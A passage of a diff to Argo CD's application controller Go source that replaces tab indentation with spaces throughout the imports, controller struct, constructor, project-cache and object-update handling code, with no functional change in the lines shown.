\"github.com/argoproj/argo-cd/v2/pkg/client/clientset/versioned\"\n-\t\"github.com/argoproj/argo-cd/v2/pkg/client/informers/externalversions/application/v1alpha1\"\n-\tapplisters \"github.com/argoproj/argo-cd/v2/pkg/client/listers/application/v1alpha1\"\n-\t\"github.com/argoproj/argo-cd/v2/reposerver/apiclient\"\n-\t\"github.com/argoproj/argo-cd/v2/util/argo\"\n-\targodiff \"github.com/argoproj/argo-cd/v2/util/argo/diff\"\n-\tappstatecache \"github.com/argoproj/argo-cd/v2/util/cache/appstate\"\n-\t\"github.com/argoproj/argo-cd/v2/util/db\"\n-\t\"github.com/argoproj/argo-cd/v2/util/errors\"\n-\t\"github.com/argoproj/argo-cd/v2/util/glob\"\n-\tlogutils \"github.com/argoproj/argo-cd/v2/util/log\"\n-\tsettings_util \"github.com/argoproj/argo-cd/v2/util/settings\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"math\"\n+        \"net/http\"\n+        \"reflect\"\n+        \"runtime/debug\"\n+        \"sort\"\n+        \"strconv\"\n+        \"strings\"\n+        \"sync\"\n+        \"time\"\n+\n+        clustercache \"github.com/argoproj/gitops-engine/pkg/cache\"\n+        \"github.com/argoproj/gitops-engine/pkg/diff\"\n+        \"github.com/argoproj/gitops-engine/pkg/health\"\n+        synccommon \"github.com/argoproj/gitops-engine/pkg/sync/common\"\n+        \"github.com/argoproj/gitops-engine/pkg/utils/kube\"\n+        jsonpatch \"github.com/evanphx/json-patch\"\n+        log \"github.com/sirupsen/logrus\"\n+        \"golang.org/x/sync/semaphore\"\n+        v1 \"k8s.io/api/core/v1\"\n+        apierr \"k8s.io/apimachinery/pkg/api/errors\"\n+        metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n+        \"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured\"\n+        \"k8s.io/apimachinery/pkg/labels\"\n+        apiruntime \"k8s.io/apimachinery/pkg/runtime\"\n+        \"k8s.io/apimachinery/pkg/runtime/schema\"\n+        \"k8s.io/apimachinery/pkg/types\"\n+        \"k8s.io/apimachinery/pkg/util/runtime\"\n+        \"k8s.io/apimachinery/pkg/util/wait\"\n+        \"k8s.io/apimachinery/pkg/watch\"\n+        \"k8s.io/client-go/kubernetes\"\n+        \"k8s.io/client-go/tools/cache\"\n+        \"k8s.io/client-go/util/workqueue\"\n+\n+        statecache \"github.com/argoproj/argo-cd/v2/controller/cache\"\n+        \"github.com/argoproj/argo-cd/v2/controller/metrics\"\n+        \"github.com/argoproj/argo-cd/v2/pkg/apis/application\"\n+        appv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n+        appclientset \"github.com/argoproj/argo-cd/v2/pkg/client/clientset/versioned\"\n+        \"github.com/argoproj/argo-cd/v2/pkg/client/informers/externalversions/application/v1alpha1\"\n+        applisters \"github.com/argoproj/argo-cd/v2/pkg/client/listers/application/v1alpha1\"\n+        \"github.com/argoproj/argo-cd/v2/reposerver/apiclient\"\n+        \"github.com/argoproj/argo-cd/v2/util/argo\"\n+        argodiff \"github.com/argoproj/argo-cd/v2/util/argo/diff\"\n+        appstatecache \"github.com/argoproj/argo-cd/v2/util/cache/appstate\"\n+        \"github.com/argoproj/argo-cd/v2/util/db\"\n+        \"github.com/argoproj/argo-cd/v2/util/errors\"\n+        \"github.com/argoproj/argo-cd/v2/util/glob\"\n+        logutils \"github.com/argoproj/argo-cd/v2/util/log\"\n+        settings_util \"github.com/argoproj/argo-cd/v2/util/settings\"\n )\n \n const (\n-\tupdateOperationStateTimeout = 1 * time.Second\n-\t// orphanedIndex contains application which monitor orphaned resources by namespace\n-\torphanedIndex = \"orphaned\"\n+        updateOperationStateTimeout = 1 * time.Second\n+        // orphanedIndex contains application which monitor orphaned resources by namespace\n+        orphanedIndex = \"orphaned\"\n )\n \n type CompareWith int\n \n const (\n-\t// Compare live application state against state defined in latest git revision with no resolved revision caching.\n-\tCompareWithLatestForceResolve CompareWith = 3\n-\t// Compare live application state against state defined in latest git revision.\n-\tCompareWithLatest CompareWith = 2\n-\t// Compare live application state against state defined using revision of most recent comparison.\n-\tCompareWithRecent CompareWith = 1\n-\t// Skip comparison and only refresh application resources tree\n-\tComparisonWithNothing CompareWith = 0\n+        // Compare live application state against state defined in latest git revision with no resolved revision caching.\n+        CompareWithLatestForceResolve CompareWith = 3\n+        // Compare live application state against state defined in latest git revision.\n+        CompareWithLatest CompareWith = 2\n+        // Compare live application state against state defined using revision of most recent comparison.\n+        CompareWithRecent CompareWith = 1\n+        // Skip comparison and only refresh application resources tree\n+        ComparisonWithNothing CompareWith = 0\n )\n \n func (a CompareWith) Max(b CompareWith) CompareWith {\n-\treturn CompareWith(math.Max(float64(a), float64(b)))\n+        return CompareWith(math.Max(float64(a), float64(b)))\n }\n \n func (a CompareWith) Pointer() *CompareWith {\n-\treturn &a\n+        return &a\n }\n \n // ApplicationController is the controller for application resources.\n type ApplicationController struct {\n-\tcache                *appstatecache.Cache\n-\tnamespace            string\n-\tkubeClientset        kubernetes.Interface\n-\tkubectl              kube.Kubectl\n-\tapplicationClientset appclientset.Interface\n-\tauditLogger          *argo.AuditLogger\n-\t// queue contains app namespace/name\n-\tappRefreshQueue workqueue.RateLimitingInterface\n-\t// queue contains app namespace/name/comparisonType and used to request app refresh with the predefined comparison type\n-\tappComparisonTypeRefreshQueue workqueue.RateLimitingInterface\n-\tappOperationQueue             workqueue.RateLimitingInterface\n-\tprojectRefreshQueue           workqueue.RateLimitingInterface\n-\tappInformer                   cache.SharedIndexInformer\n-\tappLister                     applisters.ApplicationLister\n-\tprojInformer                  cache.SharedIndexInformer\n-\tappStateManager               AppStateManager\n-\tstateCache                    statecache.LiveStateCache\n-\tstatusRefreshTimeout          time.Duration\n-\tstatusHardRefreshTimeout      time.Duration\n-\tselfHealTimeout               time.Duration\n-\trepoClientset                 apiclient.Clientset\n-\tdb                            db.ArgoDB\n-\tsettingsMgr                   *settings_util.SettingsManager\n-\trefreshRequestedApps          map[string]CompareWith\n-\trefreshRequestedAppsMutex     *sync.Mutex\n-\tmetricsServer                 *metrics.MetricsServer\n-\tkubectlSemaphore              *semaphore.Weighted\n-\tclusterFilter                 func(cluster *appv1.Cluster) bool\n-\tprojByNameCache               sync.Map\n-\tapplicationNamespaces         []string\n+        cache                *appstatecache.Cache\n+        namespace            string\n+        kubeClientset        kubernetes.Interface\n+        kubectl              kube.Kubectl\n+        applicationClientset appclientset.Interface\n+        auditLogger          *argo.AuditLogger\n+        // queue contains app namespace/name\n+        appRefreshQueue workqueue.RateLimitingInterface\n+        // queue contains app namespace/name/comparisonType and used to request app refresh with the predefined comparison type\n+        appComparisonTypeRefreshQueue workqueue.RateLimitingInterface\n+        appOperationQueue             workqueue.RateLimitingInterface\n+        projectRefreshQueue           workqueue.RateLimitingInterface\n+        appInformer                   cache.SharedIndexInformer\n+        appLister                     applisters.ApplicationLister\n+        projInformer                  cache.SharedIndexInformer\n+        appStateManager               AppStateManager\n+        stateCache                    statecache.LiveStateCache\n+        statusRefreshTimeout          time.Duration\n+        statusHardRefreshTimeout      time.Duration\n+        selfHealTimeout               time.Duration\n+        repoClientset                 apiclient.Clientset\n+        db                            db.ArgoDB\n+        settingsMgr                   *settings_util.SettingsManager\n+        refreshRequestedApps          map[string]CompareWith\n+        refreshRequestedAppsMutex     *sync.Mutex\n+        metricsServer                 *metrics.MetricsServer\n+        kubectlSemaphore              *semaphore.Weighted\n+        clusterFilter                 func(cluster *appv1.Cluster) bool\n+        projByNameCache               sync.Map\n+        applicationNamespaces         []string\n }\n \n // NewApplicationController creates new instance of ApplicationController.\n func NewApplicationController(\n-\tnamespace string,\n-\tsettingsMgr *settings_util.SettingsManager,\n-\tkubeClientset kubernetes.Interface,\n-\tapplicationClientset appclientset.Interface,\n-\trepoClientset apiclient.Clientset,\n-\targoCache *appstatecache.Cache,\n-\tkubectl kube.Kubectl,\n-\tappResyncPeriod time.Duration,\n-\tappHardResyncPeriod time.Duration,\n-\tselfHealTimeout time.Duration,\n-\tmetricsPort int,\n-\tmetricsCacheExpiration time.Duration,\n-\tmetricsApplicationLabels []string,\n-\tkubectlParallelismLimit int64,\n-\tpersistResourceHealth bool,\n-\tclusterFilter func(cluster *appv1.Cluster) bool,\n-\tapplicationNamespaces []string,\n+        namespace string,\n+        settingsMgr *settings_util.SettingsManager,\n+        kubeClientset kubernetes.Interface,\n+        applicationClientset appclientset.Interface,\n+        repoClientset apiclient.Clientset,\n+        argoCache *appstatecache.Cache,\n+        kubectl kube.Kubectl,\n+        appResyncPeriod time.Duration,\n+        appHardResyncPeriod time.Duration,\n+        selfHealTimeout time.Duration,\n+        metricsPort int,\n+        metricsCacheExpiration time.Duration,\n+        metricsApplicationLabels []string,\n+        kubectlParallelismLimit int64,\n+        persistResourceHealth bool,\n+        clusterFilter func(cluster *appv1.Cluster) bool,\n+        applicationNamespaces []string,\n ) (*ApplicationController, error) {\n-\tlog.Infof(\"appResyncPeriod=%v, appHardResyncPeriod=%v\", appResyncPeriod, appHardResyncPeriod)\n-\tdb := db.NewDB(namespace, settingsMgr, kubeClientset)\n-\tctrl := ApplicationController{\n-\t\tcache:                         argoCache,\n-\t\tnamespace:                     namespace,\n-\t\tkubeClientset:                 kubeClientset,\n-\t\tkubectl:                       kubectl,\n-\t\tapplicationClientset:          applicationClientset,\n-\t\trepoClientset:                 repoClientset,\n-\t\tappRefreshQueue:               workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"app_reconciliation_queue\"),\n-\t\tappOperationQueue:             workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"app_operation_processing_queue\"),\n-\t\tprojectRefreshQueue:           workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"project_reconciliation_queue\"),\n-\t\tappComparisonTypeRefreshQueue: workqueue.NewRateLimitingQueue(workqueue.DefaultControllerRateLimiter()),\n-\t\tdb:                            db,\n-\t\tstatusRefreshTimeout:          appResyncPeriod,\n-\t\tstatusHardRefreshTimeout:      appHardResyncPeriod,\n-\t\trefreshRequestedApps:          make(map[string]CompareWith),\n-\t\trefreshRequestedAppsMutex:     &sync.Mutex{},\n-\t\tauditLogger:                   argo.NewAuditLogger(namespace, kubeClientset, \"argocd-application-controller\"),\n-\t\tsettingsMgr:                   settingsMgr,\n-\t\tselfHealTimeout:               selfHealTimeout,\n-\t\tclusterFilter:                 clusterFilter,\n-\t\tprojByNameCache:               sync.Map{},\n-\t\tapplicationNamespaces:         applicationNamespaces,\n-\t}\n-\tif kubectlParallelismLimit > 0 {\n-\t\tctrl.kubectlSemaphore = semaphore.NewWeighted(kubectlParallelismLimit)\n-\t}\n-\tkubectl.SetOnKubectlRun(ctrl.onKubectlRun)\n-\tappInformer, appLister := ctrl.newApplicationInformerAndLister()\n-\tindexers := cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc}\n-\tprojInformer := v1alpha1.NewAppProjectInformer(applicationClientset, namespace, appResyncPeriod, indexers)\n-\tprojInformer.AddEventHandler(cache.ResourceEventHandlerFuncs{\n-\t\tAddFunc: func(obj interface{}) {\n-\t\t\tif key, err := cache.MetaNamespaceKeyFunc(obj); err == nil {\n-\t\t\t\tctrl.projectRefreshQueue.Add(key)\n-\t\t\t\tif projMeta, ok := obj.(metav1.Object); ok {\n-\t\t\t\t\tctrl.InvalidateProjectsCache(projMeta.GetName())\n-\t\t\t\t}\n-\n-\t\t\t}\n-\t\t},\n-\t\tUpdateFunc: func(old, new interface{}) {\n-\t\t\tif key, err := cache.MetaNamespaceKeyFunc(new); err == nil {\n-\t\t\t\tctrl.projectRefreshQueue.Add(key)\n-\t\t\t\tif projMeta, ok := new.(metav1.Object); ok {\n-\t\t\t\t\tctrl.InvalidateProjectsCache(projMeta.GetName())\n-\t\t\t\t}\n-\t\t\t}\n-\t\t},\n-\t\tDeleteFunc: func(obj interface{}) {\n-\t\t\tif key, err := cache.DeletionHandlingMetaNamespaceKeyFunc(obj); err == nil {\n-\t\t\t\tctrl.projectRefreshQueue.Add(key)\n-\t\t\t\tif projMeta, ok := obj.(metav1.Object); ok {\n-\t\t\t\t\tctrl.InvalidateProjectsCache(projMeta.GetName())\n-\t\t\t\t}\n-\t\t\t}\n-\t\t},\n-\t})\n-\tmetricsAddr := fmt.Sprintf(\"0.0.0.0:%d\", metricsPort)\n-\tvar err error\n-\tctrl.metricsServer, err = metrics.NewMetricsServer(metricsAddr, appLister, ctrl.canProcessApp, func(r *http.Request) error {\n-\t\treturn nil\n-\t}, metricsApplicationLabels)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif metricsCacheExpiration.Seconds() != 0 {\n-\t\terr = ctrl.metricsServer.SetExpiration(metricsCacheExpiration)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\tstateCache := statecache.NewLiveStateCache(db, appInformer, ctrl.settingsMgr, kubectl, ctrl.metricsServer, ctrl.handleObjectUpdated, clusterFilter, argo.NewResourceTracking())\n-\tappStateManager := NewAppStateManager(db, applicationClientset, repoClientset, namespace, kubectl, ctrl.settingsMgr, stateCache, projInformer, ctrl.metricsServer, argoCache, ctrl.statusRefreshTimeout, argo.NewResourceTracking(), persistResourceHealth)\n-\tctrl.appInformer = appInformer\n-\tctrl.appLister = appLister\n-\tctrl.projInformer = projInformer\n-\tctrl.appStateManager = appStateManager\n-\tctrl.stateCache = stateCache\n-\n-\treturn &ctrl, nil\n+        log.Infof(\"appResyncPeriod=%v, appHardResyncPeriod=%v\", appResyncPeriod, appHardResyncPeriod)\n+        db := db.NewDB(namespace, settingsMgr, kubeClientset)\n+        ctrl := ApplicationController{\n+                cache:                         argoCache,\n+                namespace:                     namespace,\n+                kubeClientset:                 kubeClientset,\n+                kubectl:                       kubectl,\n+                applicationClientset:          applicationClientset,\n+                repoClientset:                 repoClientset,\n+                appRefreshQueue:               workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"app_reconciliation_queue\"),\n+                appOperationQueue:             workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"app_operation_processing_queue\"),\n+                projectRefreshQueue:           workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"project_reconciliation_queue\"),\n+                appComparisonTypeRefreshQueue: workqueue.NewRateLimitingQueue(workqueue.DefaultControllerRateLimiter()),\n+                db:                            db,\n+                statusRefreshTimeout:          appResyncPeriod,\n+                statusHardRefreshTimeout:      appHardResyncPeriod,\n+                refreshRequestedApps:          make(map[string]CompareWith),\n+                refreshRequestedAppsMutex:     &sync.Mutex{},\n+                auditLogger:                   argo.NewAuditLogger(namespace, kubeClientset, \"argocd-application-controller\"),\n+                settingsMgr:                   settingsMgr,\n+                selfHealTimeout:               selfHealTimeout,\n+                clusterFilter:                 clusterFilter,\n+                projByNameCache:               sync.Map{},\n+                applicationNamespaces:         applicationNamespaces,\n+        }\n+        if kubectlParallelismLimit > 0 {\n+                ctrl.kubectlSemaphore = semaphore.NewWeighted(kubectlParallelismLimit)\n+        }\n+        kubectl.SetOnKubectlRun(ctrl.onKubectlRun)\n+        appInformer, appLister := ctrl.newApplicationInformerAndLister()\n+        indexers := cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc}\n+        projInformer := v1alpha1.NewAppProjectInformer(applicationClientset, namespace, appResyncPeriod, indexers)\n+        projInformer.AddEventHandler(cache.ResourceEventHandlerFuncs{\n+                AddFunc: func(obj interface{}) {\n+                        if key, err := cache.MetaNamespaceKeyFunc(obj); err == nil {\n+                                ctrl.projectRefreshQueue.Add(key)\n+                                if projMeta, ok := obj.(metav1.Object); ok {\n+                                        ctrl.InvalidateProjectsCache(projMeta.GetName())\n+                                }\n+\n+                        }\n+                },\n+                UpdateFunc: func(old, new interface{}) {\n+                        if key, err := cache.MetaNamespaceKeyFunc(new); err == nil {\n+                                ctrl.projectRefreshQueue.Add(key)\n+                                if projMeta, ok := new.(metav1.Object); ok {\n+                                        ctrl.InvalidateProjectsCache(projMeta.GetName())\n+                                }\n+                        }\n+                },\n+                DeleteFunc: func(obj interface{}) {\n+                        if key, err := cache.DeletionHandlingMetaNamespaceKeyFunc(obj); err == nil {\n+                                ctrl.projectRefreshQueue.Add(key)\n+                                if projMeta, ok := obj.(metav1.Object); ok {\n+                                        ctrl.InvalidateProjectsCache(projMeta.GetName())\n+                                }\n+                        }\n+                },\n+        })\n+        metricsAddr := fmt.Sprintf(\"0.0.0.0:%d\", metricsPort)\n+        var err error\n+        ctrl.metricsServer, err = metrics.NewMetricsServer(metricsAddr, appLister, ctrl.canProcessApp, func(r *http.Request) error {\n+                return nil\n+        }, metricsApplicationLabels)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if metricsCacheExpiration.Seconds() != 0 {\n+                err = ctrl.metricsServer.SetExpiration(metricsCacheExpiration)\n+                if err != nil {\n+                        return nil, err\n+                }\n+        }\n+        stateCache := statecache.NewLiveStateCache(db, appInformer, ctrl.settingsMgr, kubectl, ctrl.metricsServer, ctrl.handleObjectUpdated, clusterFilter, argo.NewResourceTracking())\n+        appStateManager := NewAppStateManager(db, applicationClientset, repoClientset, namespace, kubectl, ctrl.settingsMgr, stateCache, projInformer, ctrl.metricsServer, argoCache, ctrl.statusRefreshTimeout, argo.NewResourceTracking(), persistResourceHealth)\n+        ctrl.appInformer = appInformer\n+        ctrl.appLister = appLister\n+        ctrl.projInformer = projInformer\n+        ctrl.appStateManager = appStateManager\n+        ctrl.stateCache = stateCache\n+\n+        return &ctrl, nil\n }\n \n func (ctrl *ApplicationController) InvalidateProjectsCache(names ...string) {\n-\tif len(names) > 0 {\n-\t\tfor _, name := range names {\n-\t\t\tctrl.projByNameCache.Delete(name)\n-\t\t}\n-\t} else {\n-\t\tctrl.projByNameCache.Range(func(key, _ interface{}) bool {\n-\t\t\tctrl.projByNameCache.Delete(key)\n-\t\t\treturn true\n-\t\t})\n-\t}\n+        if len(names) > 0 {\n+                for _, name := range names {\n+                        ctrl.projByNameCache.Delete(name)\n+                }\n+        } else {\n+                ctrl.projByNameCache.Range(func(key, _ interface{}) bool {\n+                        ctrl.projByNameCache.Delete(key)\n+                        return true\n+                })\n+        }\n }\n \n func (ctrl *ApplicationController) GetMetricsServer() *metrics.MetricsServer {\n-\treturn ctrl.metricsServer\n+        return ctrl.metricsServer\n }\n \n func (ctrl *ApplicationController) onKubectlRun(command string) (kube.CleanupFunc, error) {\n-\tctrl.metricsServer.IncKubectlExec(command)\n-\tif ctrl.kubectlSemaphore != nil {\n-\t\tif err := ctrl.kubectlSemaphore.Acquire(context.Background(), 1); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tctrl.metricsServer.IncKubectlExecPending(command)\n-\t}\n-\treturn func() {\n-\t\tif ctrl.kubectlSemaphore != nil {\n-\t\t\tctrl.kubectlSemaphore.Release(1)\n-\t\t\tctrl.metricsServer.DecKubectlExecPending(command)\n-\t\t}\n-\t}, nil\n+        ctrl.metricsServer.IncKubectlExec(command)\n+        if ctrl.kubectlSemaphore != nil {\n+                if err := ctrl.kubectlSemaphore.Acquire(context.Background(), 1); err != nil {\n+                        return nil, err\n+                }\n+                ctrl.metricsServer.IncKubectlExecPending(command)\n+        }\n+        return func() {\n+                if ctrl.kubectlSemaphore != nil {\n+                        ctrl.kubectlSemaphore.Release(1)\n+                        ctrl.metricsServer.DecKubectlExecPending(command)\n+                }\n+        }, nil\n }\n \n func isSelfReferencedApp(app *appv1.Application, ref v1.ObjectReference) bool {\n-\tgvk := ref.GroupVersionKind()\n-\treturn ref.UID == app.UID &&\n-\t\tref.Name == app.Name &&\n-\t\tref.Namespace == app.Namespace &&\n-\t\tgvk.Group == application.Group &&\n-\t\tgvk.Kind == application.ApplicationKind\n+        gvk := ref.GroupVersionKind()\n+        return ref.UID == app.UID &&\n+                ref.Name == app.Name &&\n+                ref.Namespace == app.Namespace &&\n+                gvk.Group == application.Group &&\n+                gvk.Kind == application.ApplicationKind\n }\n \n func (ctrl *ApplicationController) newAppProjCache(name string) *appProjCache {\n-\treturn &appProjCache{name: name, ctrl: ctrl}\n+        return &appProjCache{name: name, ctrl: ctrl}\n }\n \n type appProjCache struct {\n-\tname string\n-\tctrl *ApplicationController\n+        name string\n+        ctrl *ApplicationController\n \n-\tlock    sync.Mutex\n-\tappProj *appv1.AppProject\n+        lock    sync.Mutex\n+        appProj *appv1.AppProject\n }\n \n // GetAppProject gets an AppProject from the cache. If the AppProject is not\n // yet cached, retrieves the AppProject from the K8s control plane and stores\n // in the cache.\n func (projCache *appProjCache) GetAppProject(ctx context.Context) (*appv1.AppProject, error) {\n-\tprojCache.lock.Lock()\n-\tdefer projCache.lock.Unlock()\n-\tif projCache.appProj != nil {\n-\t\treturn projCache.appProj, nil\n-\t}\n-\tproj, err := argo.GetAppProjectByName(projCache.name, applisters.NewAppProjectLister(projCache.ctrl.projInformer.GetIndexer()), projCache.ctrl.namespace, projCache.ctrl.settingsMgr, projCache.ctrl.db, ctx)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tprojCache.appProj = proj\n-\treturn projCache.appProj, nil\n+        projCache.lock.Lock()\n+        defer projCache.lock.Unlock()\n+        if projCache.appProj != nil {\n+                return projCache.appProj, nil\n+        }\n+        proj, err := argo.GetAppProjectByName(projCache.name, applisters.NewAppProjectLister(projCache.ctrl.projInformer.GetIndexer()), projCache.ctrl.namespace, projCache.ctrl.settingsMgr, projCache.ctrl.db, ctx)\n+        if err != nil {\n+                return nil, err\n+        }\n+        projCache.appProj = proj\n+        return projCache.appProj, nil\n }\n \n // getAppProj gets the AppProject for the given Application app.\n func (ctrl *ApplicationController) getAppProj(app *appv1.Application) (*appv1.AppProject, error) {\n-\tprojCache, _ := ctrl.projByNameCache.LoadOrStore(app.Spec.GetProject(), ctrl.newAppProjCache(app.Spec.GetProject()))\n-\tproj, err := projCache.(*appProjCache).GetAppProject(context.TODO())\n-\tif err != nil {\n-\t\tif apierr.IsNotFound(err) {\n-\t\t\treturn nil, err\n-\t\t} else {\n-\t\t\treturn nil, fmt.Errorf(\"could not retrieve AppProject '%s' from cache: %v\", app.Spec.Project, err)\n-\t\t}\n-\t}\n-\tif !proj.IsAppNamespacePermitted(app, ctrl.namespace) {\n-\t\treturn nil, argo.ErrProjectNotPermitted(app.GetName(), app.GetNamespace(), proj.GetName())\n-\t}\n-\treturn proj, nil\n+        projCache, _ := ctrl.projByNameCache.LoadOrStore(app.Spec.GetProject(), ctrl.newAppProjCache(app.Spec.GetProject()))\n+        proj, err := projCache.(*appProjCache).GetAppProject(context.TODO())\n+        if err != nil {\n+                if apierr.IsNotFound(err) {\n+                        return nil, err\n+                } else {\n+                        return nil, fmt.Errorf(\"could not retrieve AppProject '%s' from cache: %v\", app.Spec.Project, err)\n+                }\n+        }\n+        if !proj.IsAppNamespacePermitted(app, ctrl.namespace) {\n+                return nil, argo.ErrProjectNotPermitted(app.GetName(), app.GetNamespace(), proj.GetName())\n+        }\n+        return proj, nil\n }\n \n func (ctrl *ApplicationController) handleObjectUpdated(managedByApp map[string]bool, ref v1.ObjectReference) {\n-\t// if namespaced resource is not managed by any app it might be orphaned resource of some other apps\n-\tif len(managedByApp) == 0 && ref.Namespace != \"\" {\n-\t\t// retrieve applications which monitor orphaned resources in the same namespace and refresh them unless resource is denied in app project\n-\t\tif objs, err := ctrl.appInformer.GetIndexer().ByIndex(orphanedIndex, ref.Namespace); err == nil {\n-\t\t\tfor i := range objs {\n-\t\t\t\tapp, ok := objs[i].(*appv1.Application)\n-\t\t\t\tif !ok {\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\n-\t\t\t\tmanagedByApp[app.InstanceName(ctrl.namespace)] = true\n-\t\t\t}\n-\t\t}\n-\t}\n-\tfor appName, isManagedResource := range managedByApp {\n-\t\t// The appName is given as <namespace>_<name>, but the indexer needs it\n-\t\t// format <namespace>/<name>\n-\t\tappKey := ctrl.toAppKey(appName)\n-\t\tobj, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey)\n-\t\tapp, ok := obj.(*appv1.Application)\n-\t\tif exists && err == nil && ok && isSelfReferencedApp(app, ref) {\n-\t\t\t// Don't force refresh app if related resource is application itself. This prevents infinite reconciliation loop.\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif !ctrl.canProcessApp(obj) {\n-\t\t\t// Don't force refresh app if app belongs to a different controller shard\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// Enforce application's permission for the source namespace\n-\t\t_, err = ctrl.getAppProj(app)\n-\t\tif err != nil {\n-\t\t\tlog.Errorf(\"Unable to determine project for app '%s': %v\", app.QualifiedName(), err)\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tlevel := ComparisonWithNothing\n-\t\tif isManagedResource {\n-\t\t\tlevel = CompareWithRecent\n-\t\t}\n-\n-\t\t// Additional check for debug level so we don't need to evaluate the\n-\t\t// format string in case of non-debug scenarios\n-\t\tif log.GetLevel() >= log.DebugLevel {\n-\t\t\tvar resKey string\n-\t\t\tif ref.Namespace != \"\" {\n-\t\t\t\tresKey = ref.Namespace + \"/\" + ref.Name\n-\t\t\t} else {\n-\t\t\t\tresKey = \"(cluster-scoped)/\" + ref.Name\n-\t\t\t}\n-\t\t\tlog.Debugf(\"Refreshing app %s for change in cluster of object %s of type %s/%s\", appKey, resKey, ref.APIVersion, ref.Kind)\n-\t\t}\n-\n-\t\tctrl.requestAppRefresh(app.QualifiedName(), &level, nil)\n-\t}\n+        // if namespaced resource is not managed by any app it might be orphaned resource of some other apps\n+        if len(managedByApp) == 0 && ref.Namespace != \"\" {\n+                // retrieve applications which monitor orphaned resources in the same namespace and refresh them unless resource is denied in app project\n+                if objs, err := ctrl.appInformer.GetIndexer().ByIndex(orphanedIndex, ref.Namespace); err == nil {\n+                        for i := range objs {\n+                                app, ok := objs[i].(*appv1.Application)\n+                                if !ok {\n+                                        continue\n+                                }\n+\n+                                managedByApp[app.InstanceName(ctrl.namespace)] = true\n+                        }\n+                }\n+        }\n+        for appName, isManagedResource := range managedByApp {\n+                // The appName is given as <namespace>_<name>, but the indexer needs it\n+                // format <namespace>/<name>\n+                appKey := ctrl.toAppKey(appName)\n+                obj, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey)\n+                app, ok := obj.(*appv1.Application)\n+                if exists && err == nil && ok && isSelfReferencedApp(app, ref) {\n+                        // Don't force refresh app if related resource is application itself. This prevents infinite reconciliation loop.\n+                        continue\n+                }\n+\n+                if !ctrl.canProcessApp(obj) {\n+                        // Don't force refresh app if app belongs to a different controller shard\n+                        continue\n+                }\n+\n+                // Enforce application's permission for the source namespace\n+                _, err = ctrl.getAppProj(app)\n+                if err != nil {\n+                        log.Errorf(\"Unable to determine project for app '%s': %v\", app.QualifiedName(), err)\n+                        continue\n+                }\n+\n+                level := ComparisonWithNothing\n+                if isManagedResource {\n+                        level = CompareWithRecent\n+                }\n+\n+                // Additional check for debug level so we don't need to evaluate the\n+                // format string in case of non-debug scenarios\n+                if log.GetLevel() >= log.DebugLevel {\n+                        var resKey string\n+                        if ref.Namespace != \"\" {\n+                                resKey = ref.Namespace + \"/\" + ref.Name\n+                        } else {\n+                                resKey = \"(cluster-scoped)/\" + ref.Name\n+                        }\n+                        log.Debugf(\"Refreshing app %s for change in cluster of object %s of type %s/%s\", appKey, resKey, ref.APIVersion, ref.Kind)\n+                }\n+\n+                ctrl.requestAppRefresh(app.QualifiedName(), &level, nil)\n+        }\n }\n \n // setAppManagedResources will build a list of ResourceDiff based on the provided comparisonResult\n // and persist app resources related data in the cache. Will return the persisted ApplicationTree.\n func (ctrl *ApplicationController) setAppManagedResources(a *appv1.Application, comparisonResult *comparisonResult) (*appv1.ApplicationTree, error) {\n-\tmanagedResources, err := ctrl.hideSecretData(a, comparisonResult)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting managed resources: %s\", err)\n-\t}\n-\ttree, err := ctrl.getResourceTree(a, managedResources)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting resource tree: %s\", err)\n-\t}\n-\terr = ctrl.cache.SetAppResourcesTree(a.InstanceName(ctrl.namespace), tree)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error setting app resource tree: %s\", err)\n-\t}\n-\terr = ctrl.cache.SetAppManagedResources(a.InstanceName(ctrl.namespace), managedResources)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error setting app managed resources: %s\", err)\n-\t}\n-\treturn tree, nil\n+        managedResources, err := ctrl.hideSecretData(a, comparisonResult)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting managed resources: %s\", err)\n+        }\n+        tree, err := ctrl.getResourceTree(a, managedResources)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting resource tree: %s\", err)\n+        }\n+        err = ctrl.cache.SetAppResourcesTree(a.InstanceName(ctrl.namespace), tree)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error setting app resource tree: %s\", err)\n+        }\n+        err = ctrl.cache.SetAppManagedResources(a.InstanceName(ctrl.namespace), managedResources)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error setting app managed resources: %s\", err)\n+        }\n+        return tree, nil\n }\n \n // returns true of given resources exist in the namespace by default and not managed by the user\n func isKnownOrphanedResourceExclusion(key kube.ResourceKey, proj *appv1.AppProject) bool {\n-\tif key.Namespace == \"default\" && key.Group == \"\" && key.Kind == kube.ServiceKind && key.Name == \"kubernetes\" {\n-\t\treturn true\n-\t}\n-\tif key.Group == \"\" && key.Kind == kube.ServiceAccountKind && key.Name == 